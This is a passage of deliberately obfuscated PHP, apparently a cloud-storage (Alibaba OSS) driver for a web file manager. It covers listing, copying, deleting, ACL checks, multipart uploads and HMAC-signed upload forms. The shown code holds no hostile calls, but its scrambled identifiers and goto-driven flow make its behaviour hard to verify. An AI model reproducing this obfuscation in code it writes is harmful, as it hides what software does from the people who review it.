array($CĞ‘µîÛµ°[175] => isset($C¾¯š¾‰Ää[0]) ? $C¾¯š¾‰Ää[0] : $CĞ‘µîÛµ°[33], $CĞ‘µîÛµ°[179] => $B›ò›è…¼, $CĞ‘µîÛµ°[1178] => $F¥Ç ÈËÅ•, $CĞ‘µîÛµ°[1179] => isset($a·ª•‰Ú§[0]) ? $a·ª•‰Ú§[0] : $CĞ‘µîÛµ°[33], $CĞ‘µîÛµ°[177] => isset($DÌ¼àóïÈñ[0]) ? $DÌ¼àóïÈñ[0] : $CĞ‘µîÛµ°[33]); goto AŒ†ƒÂÓ¢ ; DÊì„ÛÒ¯: $CĞ‘µîÛµ° =& $_SERVER[Æ]; $cµÏ¯íİ“ = null; try { $cµÏ¯íİ“ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $c›‘Åß–²) { return null; } goto aÇß»Ò‡Ü“; aÇß»Ò‡Ü“: if (!$cµÏ¯íİ“ || !($AÇìë’”•¬ = $cµÏ¯íİ“->getRules())) { return null; } $C¾¯š¾‰Ää = $AÇìë’”•¬[0]->getAllowedOrigins(); $B›ò›è…¼ = $AÇìë’”•¬[0]->getAllowedMethods(); goto f‡‹½Ş¨®„; AŒ†ƒÂÓ¢ : } public function isBucketCors() { goto Dáò‰’…øò; B´Ä³öçó: $AŒ‰™ÊëÚŠ = array($CëÂ™ÉŒˆç[180], $CëÂ™ÉŒˆç[181], $CëÂ™ÉŒˆç[182], $CëÂ™ÉŒˆç[183], $CëÂ™ÉŒˆç[184]); $E¾ƒ´ÙáÂ = array_diff($AŒ‰™ÊëÚŠ, $f÷Á„‰‡õ²); return empty($E¾ƒ´ÙáÂ); goto BµÄï•‚; Dáò‰’…øò: $CëÂ™ÉŒˆç =& $_SERVER[Æ]; $f—İèÙù¨ = $this->getBucketCors(); if (!$f—İèÙù¨ || !is_array($f—İèÙù¨)) { return !1; } goto eÖÓ§Î¬›õ; eÖÓ§Î¬›õ: if ($f—İèÙù¨[$CëÂ™ÉŒˆç[175]] != $CëÂ™ÉŒˆç[176] || $f—İèÙù¨[$CëÂ™ÉŒˆç[177]] != $CëÂ™ÉŒˆç[176]) { return !1; } $f÷Á„‰‡õ² = array_map($CëÂ™ÉŒˆç[178], $f—İèÙù¨[$CëÂ™ÉŒˆç[179]]); if (!is_array($f÷Á„‰‡õ²)) { $f÷Á„‰‡õ² = array(); } goto B´Ä³öçó; BµÄï•‚: } public function mkfile($b¦®Œ­ä², $Eùšæˆ«¤ = '', $D°Ö„ñøë = REPEAT_RENAME) { $B‚ğ©¼Îø… = $this->setContent($b¦®Œ­ä², $Eùšæˆ«¤); if ($B‚ğ©¼Îø… !== !1) { return $this->getPathOuter($b¦®Œ­ä²); } return !1; } public function mkdir($Eá¤³›ô½ù, $CŞ“¶’âË‹ = REPEAT_SKIP) { if ($this->_isFolder($Eá¤³›ô½ù)) { return $this->getPathOuter($Eá¤³›ô½ù); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Eá¤³›ô½ù)); } catch (OSS\Core\OssException $c¿ŒŒñ¼Ä) { return !1; } return $this->getPathOuter($Eá¤³›ô½ù); } private function fileList($DÓïëÊƒ¢È, $Böã­©Éİš = '', $B±™‡»Ö† = 0) { goto fè†Êæğ£; cÛ³¶ö¶è: while (!0) { $dÊª‚–Ì¿½ = array($AíĞ÷¯ÄäÓ[1180] => $Böã­©Éİš, $AíĞ÷¯ÄäÓ[186] => $fîÕàîÓ¦‚, $AíĞ÷¯ÄäÓ[1181] => $F¸‹¸ø¡ó¡, $AíĞ÷¯ÄäÓ[1182] => $d¯Áóôùˆ®); try { $C—Šøó³Õ = $this->client->listObjects($this->bucket, $dÊª‚–Ì¿½); } catch (OSS\Core\OssException $a¦Ÿ×³Ù‘Â) { break; } $d¯Áóôùˆ® = $C—Šøó³Õ->getNextMarker(); $C§Ã’’— = $C—Šøó³Õ->getObjectList(); $f†ê²Ö†°ç = $C—Šøó³Õ->getPrefixList(); foreach ($C§Ã’’— as $d†¥Ï‹’’¶) { if ($d†¥Ï‹’’¶->getKey() == $fîÕàîÓ¦‚) { continue; } $bÅ‘ç¹‰ºã = $d†¥Ï‹’’¶->getKey(); if ($B±™‡»Ö†) { $bÅ‘ç¹‰ºã = array($AíĞ÷¯ÄäÓ[28] => $bÅ‘ç¹‰ºã, $AíĞ÷¯ÄäÓ[77] => $d†¥Ï‹’’¶->getSize(), $AíĞ÷¯ÄäÓ[190] => strtotime($d†¥Ï‹’’¶->getLastModified())); } $cƒìÅØ•ì[] = $bÅ‘ç¹‰ºã; } foreach ($f†ê²Ö†°ç as $BàÖĞÏ§±Ã) { $bµõÀÔ¡÷[] = $BàÖĞÏ§±Ã->getPrefix(); } if ($d¯Áóôùˆ® === $AíĞ÷¯ÄäÓ[33]) { break; } } return array($AíĞ÷¯ÄäÓ[74] => $bµõÀÔ¡÷, $AíĞ÷¯ÄäÓ[73] => $cƒìÅØ•ì); goto fì¥ßÀ–ÛÎ; fè†Êæğ£: $AíĞ÷¯ÄäÓ =& $_SERVER[Æ]; $DÓïëÊƒ¢È = trim($DÓïëÊƒ¢È, $AíĞ÷¯ÄäÓ[8]); $fîÕàîÓ¦‚ = empty($DÓïëÊƒ¢È) ? $AíĞ÷¯ÄäÓ[33] : $DÓïëÊƒ¢È . $AíĞ÷¯ÄäÓ[8]; goto dğ¶ÎÒ¦‚; dğ¶ÎÒ¦‚: $d¯Áóôùˆ® = $AíĞ÷¯ÄäÓ[33]; $F¸‹¸ø¡ó¡ = 1000; $bµõÀÔ¡÷ = $cƒìÅØ•ì = array(); goto cÛ³¶ö¶è; fì¥ßÀ–ÛÎ: } public function copyFile($Có¨áœùŞ, $c‹ÚÂ°‹ß™) { $a ÍÛÑëÖ© = $this->size($Có¨áœùŞ); if ($a ÍÛÑëÖ© < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Có¨áœùŞ, $this->bucket, $this->pathEncode($c‹ÚÂ°‹ß™)); } catch (OSS\Core\OssException $a¥¬½„­‚) { return !1; } return !0; } return $this->multiCopyObject($Có¨áœùŞ, $c‹ÚÂ°‹ß™, $a ÍÛÑëÖ©); } private function multiCopyObject($fì×ø’øï¼, $CÅØÖÄá , $BšÔßêø¸º) { $aá£Â ‘Şñ =& $_SERVER[Æ]; try { goto bŠ‰ª«Ç»Ú; dòÉ¾‡“† : $d‡Ã®œ¢÷² = 1; $B§à†ğ¾ª¶ = 0; $CÜ÷å†¡ì = array(); goto FÅÖÉƒÓ¹¯; FÅÖÉƒÓ¹¯: $cê²„İ§æ = 1024 * 1024 * 10; $F ’äŸ†â• = $this->client->generateMultiuploadParts($BšÔßêø¸º, $cê²„İ§æ); foreach ($F ’äŸ†â• as $A¡øÛ³Ş¤§ => $e™Á›Ÿ¸ª¸) { $FÅ¶Ø¹±Û = $B§à†ğ¾ª¶ + (int) $e™Á›Ÿ¸ª¸[$aá£Â ‘Şñ[1184]]; $A´¦®¼’²ï = (int) $e™Á›Ÿ¸ª¸[$aá£Â ‘Şñ[325]] + $FÅ¶Ø¹±Û - 1; $DÚîƒêÏœÄ = array($aá£Â ‘Şñ[1185] => $FÅ¶Ø¹±Û, $aá£Â ‘Şñ[1186] => $A´¦®¼’²ï); $CÜ÷å†¡ì[] = $this->client->uploadPartCopy($this->bucket, $fì×ø’øï¼, $this->bucket, $this->pathEncode($CÅØÖÄá ), $d‡Ã®œ¢÷², $CÛÌÄ›ìÖ¾, $DÚîƒêÏœÄ); $d‡Ã®œ¢÷² = $d‡Ã®œ¢÷² + 1; } goto DŞšÙ¦Ûœ†; bŠ‰ª«Ç»Ú: $e±Ù»ìÔÓ = array(); if ($d†Ô…šøÔŞ = $this->hashMd5($fì×ø’øï¼)) { $e±Ù»ìÔÓ = array(OSS\OssClient::OSS_HEADERS => array($aá£Â ‘Şñ[1183] => $d†Ô…šøÔŞ)); } $CÛÌÄ›ìÖ¾ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($CÅØÖÄá ), $e±Ù»ìÔÓ); goto dòÉ¾‡“† ; DŞšÙ¦Ûœ†: $c¹ë·¡Ã = array(); foreach ($CÜ÷å†¡ì as $A¡øÛ³Ş¤§ => $Cï—“É·”À) { $c¹ë·¡Ã[] = array($aá£Â ‘Şñ[1187] => $A¡øÛ³Ş¤§ + 1, $aá£Â ‘Şñ[1188] => $Cï—“É·”À); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($CÅØÖÄá ), $CÛÌÄ›ìÖ¾, $c¹ë·¡Ã); goto Dµà˜ˆ¬ÒÆ; Dµà˜ˆ¬ÒÆ: } catch (OSS\Core\OssException $bÛˆÏÑ¡œ“) { return !1; } return !0; } public function moveFile($CØô èâ—, $fËƒ‰öæ‹æ) { if ($this->copyFile($CØô èâ—, $fËƒ‰öæ‹æ)) { $this->remove($CØô èâ—); return !0; } return !1; } public function delFile($dÚ‚õĞã‡ö) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dÚ‚õĞã‡ö)); } catch (OSS\Core\OssException $dôóØÄÎØÇ) { return !1; } return !0; } public function delFolder($Bä®°äù”Î) { $CÊ°ñ××Ô¬ =& $_SERVER[Æ]; $e‰×Ñ˜ö¬« = $this->fileList($Bä®°äù”Î); if (!empty($Bä®°äù”Î) && !in_array(trim($Bä®°äù”Î, $CÊ°ñ××Ô¬[8]) . $CÊ°ñ××Ô¬[8], $e‰×Ñ˜ö¬«[$CÊ°ñ××Ô¬[73]])) { $e‰×Ñ˜ö¬«[$CÊ°ñ××Ô¬[73]][] = trim($Bä®°äù”Î, $CÊ°ñ××Ô¬[8]) . $CÊ°ñ××Ô¬[8]; } foreach (array_chunk($e‰×Ñ˜ö¬«[$CÊ°ñ××Ô¬[73]], 1000) as $B—„»¼Œ„›) { try { $this->client->deleteObjects($this->bucket, $B—„»¼Œ„›); } catch (OSS\Core\OssException $câÃ‰ªš¯¯) { continue; } } return !0; } public function rename($Aï¼êÍÔ, $d£–”øÎ†ß) { return $this->renameObject($Aï¼êÍÔ, $d£–”øÎ†ß); } private function fileInfo($f‡éÊ“Î, $Bã›¸Øİ· = array()) { goto Fªäéßé×; Fªäéßé×: $eèÙ²‰¨Ä =& $_SERVER[Æ]; $F­•¹ì‹ì = array($eèÙ²‰¨Ä[28] => $this->pathThis($f‡éÊ“Î), $eèÙ²‰¨Ä[75] => $this->getPathOuter($f‡éÊ“Î), $eèÙ²‰¨Ä[29] => $eèÙ²‰¨Ä[167], $eèÙ²‰¨Ä[187] => 0, $eèÙ²‰¨Ä[107] => 0, $eèÙ²‰¨Ä[77] => 0, $eèÙ²‰¨Ä[160] => $this->ext($f‡éÊ“Î), $eèÙ²‰¨Ä[188] => !0, $eèÙ²‰¨Ä[189] => !0); if (empty($Bã›¸Øİ·)) { $AâŒöŸ¦„— = $this->objectMeta($f‡éÊ“Î); if (!$AâŒöŸ¦„—) { return $F­•¹ì‹ì; } $Bã›¸Øİ· = array($eèÙ²‰¨Ä[107] => strtotime($AâŒöŸ¦„—[$eèÙ²‰¨Ä[1189]]), $eèÙ²‰¨Ä[77] => $AâŒöŸ¦„—[$eèÙ²‰¨Ä[1190]] + 0); } goto B«ì†ßÁÓë; B«ì†ßÁÓë: if (isset($Bã›¸Øİ·[$eèÙ²‰¨Ä[77]])) { $F­•¹ì‹ì[$eèÙ²‰¨Ä[77]] = $Bã›¸Øİ·[$eèÙ²‰¨Ä[77]]; } if (isset($Bã›¸Øİ·[$eèÙ²‰¨Ä[107]])) { $F­•¹ì‹ì[$eèÙ²‰¨Ä[107]] = $Bã›¸Øİ·[$eèÙ²‰¨Ä[107]]; } if (isset($Bã›¸Øİ·[$eèÙ²‰¨Ä[190]]) && !trim($F­•¹ì‹ì[$eèÙ²‰¨Ä[107]])) { $F­•¹ì‹ì[$eèÙ²‰¨Ä[107]] = $Bã›¸Øİ·[$eèÙ²‰¨Ä[190]]; } goto f—Ë¦÷„¸Ù; f—Ë¦÷„¸Ù: return $F­•¹ì‹ì; goto F÷¥Ïˆ›’; F÷¥Ïˆ›’: } private function folderInfo($BÏî‡ê«†, $d©×¢‹»‘ = array()) { $CÛí§îŸ× =& $_SERVER[Æ]; $a¤ĞöÔ‹¥ = array($CÛí§îŸ×[28] => $this->pathThis($BÏî‡ê«†), $CÛí§îŸ×[75] => $this->getPathOuter($CÛí§îŸ×[8] . $BÏî‡ê«†), $CÛí§îŸ×[29] => $CÛí§îŸ×[76], $CÛí§îŸ×[187] => 0, $CÛí§îŸ×[107] => 0, $CÛí§îŸ×[188] => !0, $CÛí§îŸ×[189] => !0); if (empty($d©×¢‹»‘)) { $BÏî‡ê«† = rtrim($BÏî‡ê«†, $CÛí§îŸ×[8]) . $CÛí§îŸ×[8]; $Cğ„ïË‚Ì = $this->objectMeta($BÏî‡ê«†); if (!$Cğ„ïË‚Ì) { return $a¤ĞöÔ‹¥; } $d©×¢‹»‘ = array($CÛí§îŸ×[187] => $Cğ„ïË‚Ì[$CÛí§îŸ×[1191]][$CÛí§îŸ×[1192]], $CÛí§îŸ×[107] => strtotime($Cğ„ïË‚Ì[$CÛí§îŸ×[1189]])); } if (isset($d©×¢‹»‘[$CÛí§îŸ×[107]])) { $a¤ĞöÔ‹¥[$CÛí§îŸ×[107]] = $d©×¢‹»‘[$CÛí§îŸ×[107]]; } if (isset($d©×¢‹»‘[$CÛí§îŸ×[187]])) { $a¤ĞöÔ‹¥[$CÛí§îŸ×[187]] = $d©×¢‹»‘[$CÛí§îŸ×[187]]; } return $a¤ĞöÔ‹¥; } public function listPath($FÜÍÇÅ´÷, $FÇÌ³§¦÷ = false) { $fã¶Üà”ß‘ =& $_SERVER[Æ]; $c½›³ğÎõ÷ = $this->fileList($FÜÍÇÅ´÷, $fã¶Üà”ß‘[8], !0); foreach ($c½›³ğÎõ÷[$fã¶Üà”ß‘[74]] as $fìŒ‘›×´ => $fõ—äÇÆÅ) { $c½›³ğÎõ÷[$fã¶Üà”ß‘[74]][$fìŒ‘›×´] = $this->folderInfo($fõ—äÇÆÅ, $fõ—äÇÆÅ); } foreach ($c½›³ğÎõ÷[$fã¶Üà”ß‘[73]] as $fìŒ‘›×´ => $fõ—äÇÆÅ) { $c½›³ğÎõ÷[$fã¶Üà”ß‘[73]][$fìŒ‘›×´] = $this->fileInfo($fõ—äÇÆÅ[$fã¶Üà”ß‘[28]], $fõ—äÇÆÅ); } return $c½›³ğÎõ÷; } public function has($Bç‘Ì‘¹îÅ, $F‡ßÈµñÖ° = false, $e³ìÌÕÓÄà = true) { goto D÷ÈŒÈÂ; D÷ÈŒÈÂ: $d†»òğï¡ƒ =& $_SERVER[Æ]; $Bç‘Ì‘¹îÅ = trim($Bç‘Ì‘¹îÅ, $d†»òğï¡ƒ[8]); $d£Ğ–İ¥Ë = empty($Bç‘Ì‘¹îÅ) ? $d†»òğï¡ƒ[33] : $Bç‘Ì‘¹îÅ . $d†»òğï¡ƒ[8]; goto eä‹ÄÈÌ¤; b´Œ‡½ñ÷‘: return !1; goto EèÓö·ó§‡; eä‹ÄÈÌ¤: $C¾Í©Å Æ® = $d†»òğï¡ƒ[33]; $aÃÂÕØ»Öó = 500; $d¹ˆ§İæÆÁ = 0; goto cˆ·×‘“¹­; cˆ·×‘“¹­: $f¥¤ è³¼‰ = 0; while (!0) { $FÀÖËİ¥Š’ = array($d†»òğï¡ƒ[1180] => $d†»òğï¡ƒ[8], $d†»òğï¡ƒ[186] => $d£Ğ–İ¥Ë, $d†»òğï¡ƒ[1181] => $aÃÂÕØ»Öó, $d†»òğï¡ƒ[1182] => $C¾Í©Å Æ®); try { $E¬¬‡í§È = $this->client->listObjects($this->bucket, $FÀÖËİ¥Š’); } catch (OSS\Core\OssException $Fæ÷¼øà¦) { break; } $C¾Í©Å Æ® = $E¬¬‡í§È->getNextMarker(); $f‘Êª¦‘Ä = $E¬¬‡í§È->getObjectList(); $CôëÔ‡‡‚Ñ = $E¬¬‡í§È->getPrefixList(); if ($F‡ßÈµñÖ°) { if (count($f‘Êª¦‘Ä) > 1 || count($f‘Êª¦‘Ä) == 1 && $f‘Êª¦‘Ä[0]->getKey() != $d£Ğ–İ¥Ë) { $d¹ˆ§İæÆÁ += count($f‘Êª¦‘Ä) - 1; } if (!empty($CôëÔ‡‡‚Ñ)) { $f¥¤ è³¼‰ += count($CôëÔ‡‡‚Ñ); } if ($C¾Í©Å Æ® === $d†»òğï¡ƒ[33]) { break; } continue; } if ($e³ìÌÕÓÄà) { if (!empty($f‘Êª¦‘Ä)) { if (count($f‘Êª¦‘Ä) > 1 || $f‘Êª¦‘Ä[0]->getKey() != $d£Ğ–İ¥Ë) { return !0; } } } else { if (!empty($CôëÔ‡‡‚Ñ)) { return !0; } } if ($C¾Í©Å Æ® === $d†»òğï¡ƒ[33]) { break; } } if ($F‡ßÈµñÖ°) { return array($d†»òğï¡ƒ[191] => $d¹ˆ§İæÆÁ, $d†»òğï¡ƒ[192] => $f¥¤ è³¼‰); } goto b´Œ‡½ñ÷‘; EèÓö·ó§‡: } public function listAll($f÷íô«Ï) { $a×ŞÁæ¦í” =& $_SERVER[Æ]; $Eêçíè¸äŠ = $this->fileList($f÷íô«Ï, $a×ŞÁæ¦í”[33], !0); $cØÕã†¤ˆ¥ = array(); foreach ($Eêçíè¸äŠ[$a×ŞÁæ¦í”[73]] as $eÈºå„À®É) { $cØÕã†¤ˆ¥[$eÈºå„À®É[$a×ŞÁæ¦í”[28]]] = $eÈºå„À®É[$a×ŞÁæ¦í”[77]]; } return $this->listAllFiles($f÷íô«Ï, array_keys($cØÕã†¤ˆ¥), $cØÕã†¤ˆ¥); } public function canRead($A„òÈà©âÃ) { $FÛ¼Œäô† =& $_SERVER[Æ]; $AàÏˆ‘Àóä = $this->pathAcl($A„òÈà©âÃ); return $AàÏˆ‘Àóä == $FÛ¼Œäô†[1193] || $AàÏˆ‘Àóä == $FÛ¼Œäô†[491] ? !0 : !1; } public function canWrite($A‘Àï…Şß—) { $dƒñìÄÇ‹ = $this->pathAcl($A‘Àï…Şß—); return $dƒñìÄÇ‹ == $_SERVER[Æ][491] ? !0 : !1; } public function pathAcl($c”«á†ÒÙ×) { goto b•—Ù©™ƒ; b•—Ù©™ƒ: $e¥ãÂ±†Ê‹ =& $_SERVER[Æ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F†–õğ‘ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($c”«á†ÒÙ×)); } catch (OSS\Core\OssException $Eô‹¤³‚ò) { return !1; } goto Dãª¸ç‘·Ÿ; E‡ù§¥ğä¿: return $A­À¦ Á›ß; goto DËÈÕò–Ó; Dãª¸ç‘·Ÿ: $A­À¦ Á›ß = $F†–õğ‘ == $e¥ãÂ±†Ê‹[34] ? $this->bucketAcl : $F†–õğ‘; if ($A­À¦ Á›ß == $e¥ãÂ±†Ê‹[1194]) { return $e¥ãÂ±†Ê‹[1193]; } if ($A­À¦ Á›ß == $e¥ãÂ±†Ê‹[1195]) { return $e¥ãÂ±†Ê‹[491]; } goto E‡ù§¥ğä¿; DËÈÕò–Ó: } private function chmodPath($b››ÚæÛš, $B¼¦‡Œº¨ç = '') { $C°“æ¼É =& $_SERVER[Æ]; $FÈŒ¡•²‹­ = empty($B¼¦‡Œº¨ç) ? $C°“æ¼É[1195] : $B¼¦‡Œº¨ç; $A°¸¢ç– = array($C°“æ¼É[34], $C°“æ¼É[185], $C°“æ¼É[1194], $C°“æ¼É[1195]); if (!in_array($FÈŒ¡•²‹­, $A°¸¢ç–)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b››ÚæÛš), $FÈŒ¡•²‹­); } catch (OSS\Core\OssException $fƒ”¤­êë¡) { return !1; } return !0; } public function getContent($bÃ¼óæÌò×) { return $this->fileSubstr($bÃ¼óæÌò×, -1); } public function setContent($fŞÅ–„³‘‡, $bæùƒ¶–Œ = '') { $eİãå²¨‘ =& $_SERVER[Æ]; try { $Bñî°î†¯ = $this->trafficLimit($eİãå²¨‘[1196]); $A‡Œ·Õ£÷› = $this->client->putObject($this->bucket, $this->pathEncode($fŞÅ–„³‘‡), $bæùƒ¶–Œ, $Bñî°î†¯); } catch (OSS\Core\OssException $c¹ôŠƒŸ†¶) { return !1; } $cÕë¡÷Ã›ö = array($eİãå²¨‘[1183] => trim($A‡Œ·Õ£÷›[$eİãå²¨‘[1197]], $eİãå²¨‘[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fŞÅ–„³‘‡))); $this->updateObjMeta($fŞÅ–„³‘‡, $cÕë¡÷Ã›ö); return isset($A‡Œ·Õ£÷›[$eİãå²¨‘[1198]][$eİãå²¨‘[1145]]) ? (int) $A‡Œ·Õ£÷›[$eİãå²¨‘[1198]][$eİãå²¨‘[1145]] : strlen($A‡Œ·Õ£÷›); } private function updateObjMeta($eëñ˜•Ê à, $fó§¢¯Ÿµô) { $eëñ˜•Ê à = $this->pathEncode($eëñ˜•Ê à); try { $d…½ì»¢ë = array(OSS\OssClient::OSS_HEADERS => $fó§¢¯Ÿµô); $this->client->copyObject($this->bucket, $eëñ˜•Ê à, $this->bucket, $eëñ˜•Ê à, $d…½ì»¢ë); } catch (OSS\Core\OssException $F‡ãæˆ¶æ¿) { return !1; } return !0; } public function upload($Fö†Ìâ„†„, $eÜ¸’Ä­, $aİÛÓ¿éŞÛ = false, $eÜ»ãí›áÖ = REPEAT_REPLACE) { $EÜéáÆÙ®Ÿ =& $_SERVER[Æ]; $EÑ—ÇÂ‚¥´ = trim($Fö†Ìâ„†„, $EÜéáÆÙ®Ÿ[8]); $d¼‘¶¦óƒ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($EÜéáÆÙ®Ÿ[1183] => @md5_file($eÜ¸’Ä­)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Fö†Ìâ„†„))); $d¼‘¶¦óƒ = $this->trafficLimit($EÜéáÆÙ®Ÿ[1196], $d¼‘¶¦óƒ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($EÑ—ÇÂ‚¥´), $eÜ¸’Ä­, $d¼‘¶¦óƒ); } catch (OSS\Core\OssException $FİÅ°Û¸½) { return !1; } return $this->getPathOuter($Fö†Ìâ„†„); } public function getHost() { $EÏíœÚÓ® =& $_SERVER[Æ]; $d…İèÜ—‚½ = explode($EÏíœÚÓ®[171], parent::getHost()); return $d…İèÜ—‚½[0] . $EÏíœÚÓ®[171] . $this->bucket . $EÏíœÚÓ®[91] . $d…İèÜ—‚½[1]; } public function uploadFormData($DÛ¢àò›Ü, $bŸêèÅÒÚ‘ = 3600) { goto aê‹‘ÍíÌ; aŞ„š“ñ¢´: $EŸô—»ïƒá = strpos($dÅˆÛò¢Î«, $fŸÕ†ñô©‰[284]); $dÅˆÛò¢Î« = substr($dÅˆÛò¢Î«, 0, $EŸô—»ïƒá) . $fŸÕ†ñô©‰[1200]; $cîÆñ±ë‹× = 1048576000 * 5; goto a©º–ˆ¼‹³; a©º–ˆ¼‹³: $d¯çÖÓ· = $this->pathFather($DÛ¢àò›Ü); $b½±ÈÑšà = array($fŸÕ†ñô©‰[1102] => $dÅˆÛò¢Î«, $fŸÕ†ñô©‰[1103] => array(array($fŸÕ†ñô©‰[1201], 0, $cîÆñ±ë‹×), array($fŸÕ†ñô©‰[1106], $fŸÕ†ñô©‰[1107], $d¯çÖÓ·))); $cÑ¾ĞóİÊÀ = base64_encode(json_encode($b½±ÈÑšà)); goto dğïÁéÂŠØ; E¯Ü„çÃö‚: return $A«—ÃÓÕ‡è; goto E›¾„‚¯Úî; aê‹‘ÍíÌ: $fŸÕ†ñô©‰ =& $_SERVER[Æ]; if (!($b³¬ğ ‘”Š = $this->getHost())) { return !1; } $AÓªìèª´ = $bŸêèÅÒÚ‘; goto D‚ÆˆÔ­Ò¿; D‚ÆˆÔ­Ò¿: $fİÈ–ÍÇ = date($fŸÕ†ñô©‰[1199], time() + $AÓªìèª´); $Cˆ–œ‹Á’½ = new DateTime($fİÈ–ÍÇ); $dÅˆÛò¢Î« = $Cˆ–œ‹Á’½->format(DateTime::ISO8601); goto aŞ„š“ñ¢´; dğïÁéÂŠØ: $A•Ü¶ôñ¬ = base64_encode(hash_hmac($fŸÕ†ñô©‰[218], $cÑ¾ĞóİÊÀ, $this->secret, !0)); $A«—ÃÓÕ‡è = array($fŸÕ†ñô©‰[1112] => $cÑ¾ĞóİÊÀ, $fŸÕ†ñô©‰[1202] => $this->accessKey, $fŸÕ†ñô©‰[1108] => $fŸÕ†ñô©‰[1100], $fŸÕ†ñô©‰[1203] => $A•Ü¶ôñ¬, $fŸÕ†ñô©‰[169] => $b³¬ğ ‘”Š); $A«—ÃÓÕ‡è = $this->trafficLimit($fŸÕ†ñô©‰[1196], $A«—ÃÓÕ‡è); goto E¯Ü„çÃö‚; E›¾„‚¯Úî: } public function multiUploadFormData($cĞ¼‚ƒÔ‹÷, $bÏƒ’ ù = 3600) { $c§ÚÍ…”Ğ¾ =& $_SERVER[Æ]; if (!($B»ƒø²Ç« = $this->getHost())) { return !1; } $EÛÀ‘¢Ü = $this->trafficLimit($c§ÚÍ…”Ğ¾[1196]); $E¢¼ß†«¾ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cĞ¼‚ƒÔ‹÷), $EÛÀ‘¢Ü); return array($c§ÚÍ…”Ğ¾[209] => $E¢¼ß†«¾, $c§ÚÍ…”Ğ¾[169] => $B»ƒø²Ç« . $c§ÚÍ…”Ğ¾[8] . $this->pathEncode($cĞ¼‚ƒÔ‹÷), $c§ÚÍ…”Ğ¾[210] => gmdate($c§ÚÍ…”Ğ¾[1204]), $c§ÚÍ…”Ğ¾[89] => $cĞ¼‚ƒÔ‹÷); } public function multiUploadAuthData($BØ¢Ü×“¸ç, $d¢‹–ÏàÕã = array()) { goto Dø¢ë†¦Ç; C¿²Áôî: $A¤ö‹ˆÈè = $BØ¢Ü×“¸ç; if (isset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[89]])) { $A¤ö‹ˆÈè = $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[89]]; unset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[89]]); } if (isset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[211]])) { $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[210]] = $Eì¨ª‰÷Î; return $this->listUploadParts($A¤ö‹ˆÈè, $d¢‹–ÏàÕã); } goto a¬åÊí†; Dø¢ë†¦Ç: $Dñáğ¨ëÒß =& $_SERVER[Æ]; $Eì¨ª‰÷Î = isset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[210]]) ? $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[210]] : gmdate($Dñáğ¨ëÒß[1204]); $dâ²¯”ƒ‹Ÿ = isset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[160]]) ? $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[160]] : $Dñáğ¨ëÒß[33]; goto C¿²Áôî; CéÏ–’õñõ: $cß¹ÎÙø—… = $Dñáğ¨ëÒß[1207] . $this->accessKey . $Dñáğ¨ëÒß[4] . $Aëâñğ†¯ã; if (strpos($dâ²¯”ƒ‹Ÿ, $Dñáğ¨ëÒß[213]) === 0) { $cß¹ÎÙø—… = array($Dñáğ¨ëÒß[220] => $cß¹ÎÙø—…, $Dñáğ¨ëÒß[210] => $Eì¨ª‰÷Î); if ($D˜±Ì³—¤) { $cß¹ÎÙø—… = array_merge($cß¹ÎÙø—…, $D˜±Ì³—¤); } } return $cß¹ÎÙø—…; goto a¾Ãµ…Ÿ©; B¶—ó½‚Öµ: if (!empty($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[1206]])) { $B“ËØéôÓ¨ = array_merge(array($F†ÕÚ“‹º¥[4]), $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[1206]]); sort($B“ËØéôÓ¨); $F†ÕÚ“‹º¥[4] = implode($Dñáğ¨ëÒß[217], $B“ËØéôÓ¨); } $Bœ«Š…—ïÀ = implode($Dñáğ¨ëÒß[217], $F†ÕÚ“‹º¥); $Aëâñğ†¯ã = base64_encode(hash_hmac($Dñáğ¨ëÒß[218], $Bœ«Š…—ïÀ, $this->secret, !0)); goto CéÏ–’õñõ; a¬åÊí†: $F†ÕÚ“‹º¥ = array($Dñáğ¨ëÒß[212], $Dñáğ¨ëÒß[33], $Dñáğ¨ëÒß[116], $Eì¨ª‰÷Î, "\x78\55\157\163\163\x2d\144\x61\164\x65\72{$Eì¨ª‰÷Î}", $Dñáğ¨ëÒß[8] . $this->bucket . $Dñáğ¨ëÒß[8] . $A¤ö‹ˆÈè . $dâ²¯”ƒ‹Ÿ); if (strpos($dâ²¯”ƒ‹Ÿ, $Dñáğ¨ëÒß[213]) === 0) { $F†ÕÚ“‹º¥[0] = $Dñáğ¨ëÒß[214]; if ($D˜±Ì³—¤ = $this->trafficLimit($Dñáğ¨ëÒß[1196])) { $A¤ö‹ˆÈè = $Dñáğ¨ëÒß[1205]; array_splice($F†ÕÚ“‹º¥, 5, 0, $A¤ö‹ˆÈè . $Dñáğ¨ëÒß[4] . $D˜±Ì³—¤[$A¤ö‹ˆÈè]); } } if (isset($d¢‹–ÏàÕã[$Dñáğ¨ëÒß[215]]) && $d¢‹–ÏàÕã[$Dñáğ¨ëÒß[215]] == $Dñáğ¨ëÒß[216]) { $F†ÕÚ“‹º¥[0] = $Dñáğ¨ëÒß[216]; } goto B¶—ó½‚Öµ; a¾Ãµ…Ÿ©: } public function 